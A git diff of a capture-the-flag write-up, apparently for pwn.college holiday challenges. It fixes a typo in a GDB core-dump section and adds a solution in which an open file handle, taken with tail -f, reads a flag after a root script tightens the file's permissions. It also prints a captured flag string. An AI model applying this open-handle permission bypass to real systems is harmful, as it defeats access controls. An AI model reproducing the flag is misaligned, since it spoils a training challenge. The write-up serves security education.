@@ -242,7 +242,7 @@ $ ls -al coal
 -rw------- 1 root ubuntu 425984 Dec  2 19:41 coal
 ```
 
-There are multiple ways to extract the flag as well, but I wanted to see if I coudl find it in the core using GDB:
+There are multiple ways to extract the flag as well, but I wanted to see if I could find it in the core using GDB:
 ```bash
 gdb /challenge/claus ~/coal
 
@@ -272,7 +272,49 @@ gef➤  x/s 0x557a2330a0c0
   <p>Only when children sleep sweetly and nice does Santa begin his flight</p>
 </blockquote>
 
-Despite having a massive description, this is another short and sweet one. 
+Despite having a massive description, this is another short and sweet one. The challenge has an init script which launches the folowing script in the background:
+
+```bash
+#!/bin/sh
+
+set -eu
+
+GIFT="$(cat /flag)"
+rm /flag
+
+touch /stocking
+
+sleeping_nice() {
+    ps ao ni,comm --no-headers \
+        | awk '$1 > 0' \
+        | grep -q sleep
+}
+
+# Only when children sleep sweetly and nice does Santa begin his flight
+until sleeping_nice; do
+    sleep 0.1
+done
+
+chmod 400 /stocking
+printf "%s" "$GIFT" > /stocking
+
+```
+
+When nice sleep is detected, Santa will drop the flag, but not before making the stocking unreadble. Naughty! The idea is to open the `/stocking` file before Santa changes its permissions, then sleep nicely:
+
+```bash
+$ ls /stocking
+-rw-r--r-- 1 root root 0 Dec  3 12:48 /stocking
+
+$ tail -f /stocking
+pwn.college{sucGPgrXk1E5Phyq-QhxTqXukrZ.QX0gDOxIDLzQDMyQzW}
+
+- Challenge is already running. Start sleeping nicely
+
+$ nice -n 10 sleep 1
+```
+
+## Day 4 - 
 
 <div class="box-note">
 Note that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-6" target="_blank">Out-String -Stream</a> is very important here. This is needed to be able to use <b>Select-String</b> and grep through the output!
